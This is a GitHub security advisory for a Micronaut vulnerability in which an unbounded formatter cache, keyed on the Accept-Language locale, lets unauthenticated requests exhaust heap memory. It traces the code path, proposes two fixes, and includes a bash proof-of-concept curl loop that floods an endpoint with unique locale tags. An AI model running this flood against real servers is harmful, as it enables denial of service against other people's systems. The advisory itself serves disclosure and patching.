# [H] Micronaut has unbounded `formattersCache` in `TimeConverterRegistrar` that Allows Memory Exhaustion via `Accept-Language` Header

## Summary
Severity: High
Advisory: GHSA-8hjv-92q9-g4xj
CVE: CVE-2026-44241
CWE: CWE-400
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-8hjv-92q9-g4xj
Type: github-advisory

## Affected
- Maven: `io.micronaut:micronaut-context` — affected >=4.3.0 <4.10.22
- Maven: `io.micronaut:micronaut-context` — affected >=3.10.0 <3.10.6
- Maven: `io.micronaut:micronaut-context` — affected >=0 <3.8.14

## Details
## Summary

`TimeConverterRegistrar` caches `DateTimeFormatter` instances in an unbounded `ConcurrentHashMap<String, DateTimeFormatter>` whose key is derived from the `@Format` annotation pattern concatenated with the locale from the HTTP `Accept-Language` header. Because `Locale.forLanguageTag()` accepts arbitrary BCP 47 private-use extensions (`en-x-a001`, `en-x-a002`, …), an unauthenticated attacker can generate an unlimited number of unique cache keys by sending requests with novel locale tags, growing the cache until heap memory is exhausted and the JVM crashes. This is structurally identical to the recently patched GHSA-2hcp-gjrf-7fhc (`DefaultHtmlErrorResponseBodyProvider`), but `TimeConverterRegistrar.formattersCache` was not covered by that fix.

## Details

The vulnerable cache is declared in `context/src/main/java/io/micronaut/runtime/converters/time/TimeConverterRegistrar.java` at line 123:

```java
// TimeConverterRegistrar.java:123
private final Map<String, DateTimeFormatter> formattersCache = new ConcurrentHashMap<>();
```

The `getFormatter` method at line 434 inserts into this map with no eviction or size limit:

```java
// TimeConverterRegistrar.java:434-443
private DateTimeFormatter getFormatter(String pattern, ConversionContext context) {
    var key = pattern + context.getLocale();        // locale from Accept-Language header
    var cachedFormatter = formattersCache.get(key);
    if (cachedFormatter != null) {
        return cachedFormatter;
    }
    var formatter = DateTimeFormatter.ofPattern(pattern, context.getLocale());
    formattersCache.put(key, formatter);            // NO SIZE CHECK — unbounded growth
    return formatter;
}
```

The attacker-controlled locale flows into the cache key through this call chain:

1. **HTTP header parsed** — `HttpHeaders.findAcceptLanguage()` at `http/src/main/java/io/micronaut/http/HttpHeaders.java:766-771` calls `Locale.forLanguageTag(part)` directly on the raw `Accept-Language` value:

```java
// HttpHeaders.java:766-771
default Optional<Locale> findAcceptLanguage() {
    return findFirst(HttpHeaders.ACCEPT_LANGUAGE)
        .map(text -> {
            String part = HttpHeadersUtil.splitAcceptHeader(text);
            return part == null ? Locale.getDefault() : Locale.forLanguageTag(part);
        });
}
```

2. **Locale planted in ConversionContext** — `AbstractRouteMatch.newContext()` at `router/src/main/java/io/micronaut/web/router/AbstractRouteMatch.java:373-378` passes the request locale into the conversion context for every route argument binding:

```java
// AbstractRouteMatch.java:373-378
private <E> ArgumentConversionContext<E> newContext(Argument<E> argument, HttpRequest<?> request) {
    return ConversionContext.of(
        argument,
        request.getLocale().orElse(null),   // ← attacker-controlled via Accept-Language
        request.getCharacterEncoding()
    );
}
```

3. **Unbounded cache insert** — When any temporal argument annotated with `@Format` is bound, `TimeConverterRegistrar.getFormatter(pattern, context)` is called and inserts a new `DateTimeFormatter` for each unique `pattern + locale` key.

This path is triggered for any route endpoint with a `@Format`-annotated temporal parameter. This is an officially documented and commonly used Micronaut pattern, demonstrated in the framework's own test suite:

```java
// test-suite/.../BindingController.java:105 (official Micronaut example)
@Get("/dateFormat")
public String dateFormat(@Format("dd/MM/yyyy hh:mm:ss a z") @Header ZonedDateTime date) {
    return date.toString();
}
```

`TimeConverterRegistrar` is an `@Internal` core bean registered unconditionally in every Micronaut application — it is not optional or user-configured. By contrast, the `DefaultHtmlErrorResponseBodyProvider` cache patched in GHSA-2hcp-gjrf-7fhc now uses a `ConcurrentLinkedHashMap` bounded at 100 entries; `TimeConverterRegistrar.formattersCache` remains an unbounded plain `ConcurrentHashMap`.

## PoC

Against any Micronaut application exposing an endpoint with a `@Format`-annotated temporal parameter:

```bash
# Flood the formattersCache with unique locale-derived keys
for i in $(seq 1 200000); do
  curl -s -o /dev/null \
    -H "Accept-Language: en-x-$(printf '%06d' $i)" \
    -H "date: 01/01/2024 12:00:00 AM UTC" \
    "http://localhost:8080/dateFormat" &
  # Throttle to avoid socket exhaustion
  [ $((i % 500)) -eq 0 ] && wait
done
wait
# Server will throw OutOfMemoryError after enough unique locale entries accumulate
```

Each request with a novel `en-x-XXXXXX` private-use tag inserts a new `DateTimeFormatter` entry into the unbounded map. Each `DateTimeFormatter` (with locale metadata) occupies roughly 2–10 KB on the heap. At 100,000 unique entries, the map alone can consume ~500 MB; at 500,000 entries the JVM typically crashes with `OutOfMemoryError: Java heap space`.

## Impact

- An unauthenticated attacker can crash any Micronaut server that exposes at least one endpoint with a `@Format`-annotated temporal type parameter — a documented, first-class framework feature.
- Memory grows linearly with the number of unique `Accept-Language` values sent. The BCP 47 private-use namespace (`en-x-ANYTHING`) provides millions of distinct valid locale strings.
- No credentials, special permissions, or exploitation of application logic are required — only the ability to send HTTP requests with custom headers.
- `TimeConverterRegistrar` is active in all Micronaut HTTP server applications by default; no special configuration is needed to be vulnerable.

## Recommended Fix

Apply the same fix pattern used for GHSA-2hcp-gjrf-7fhc: replace the unbounded `ConcurrentHashMap` with a bounded `ConcurrentLinkedHashMap`:

```java
// In TimeConverterRegistrar.java — replace line 123
import io.micronaut.core.util.clhm.ConcurrentLinkedHashMap;

private static final int MAX_FORMATTERS_CACHE_SIZE = 100;

private final Map<String, DateTimeFormatter> formattersCache =
    new ConcurrentLinkedHashMap.Builder<String, DateTimeFormatter>()
        .maximumWeightedCapacity(MAX_FORMATTERS_CACHE_SIZE)
        .build();
```

Alternatively, since `@Format` pattern values come from static annotations (a bounded, compile-time set), the locale should be excluded from the cache key and applied at use-time instead:

```java
// In getFormatter() — cache only by pattern, apply locale at use-time
private DateTimeFormatter getFormatter(String pattern, ConversionContext context) {
    DateTimeFormatter base = formattersCache.computeIfAbsent(
        pattern, p -> DateTimeFormatter.ofPattern(p)
    );
    Locale locale = context.getLocale();
    return locale != null ? base.withLocale(locale) : base;
}
```

This second approach bounds the cache by the number of distinct `@Format` patterns in the application, which is always small and finite, fully eliminating the attack surface.

## References
- https://github.com/micronaut-projects/micronaut-core/security/advisories/GHSA-8hjv-92q9-g4xj
- https://nvd.nist.gov/vuln/detail/CVE-2026-44241
- https://github.com/micronaut-projects/micronaut-core/commit/48f05ae8dc4157816fe0050c5cf730be7d44f8b3
- https://github.com/micronaut-projects/micronaut-core/commit/c2048ab740c2efdfe227813f203176e0ef93f892
- https://github.com/micronaut-projects/micronaut-core/commit/c6ca8782de7338732e887d090f38c9e941bcb284
- https://github.com/micronaut-projects/micronaut-core
- https://github.com/micronaut-projects/micronaut-core/releases/tag/v3.10.6
- https://github.com/micronaut-projects/micronaut-core/releases/tag/v3.8.14
- https://github.com/micronaut-projects/micronaut-core/releases/tag/v4.10.22
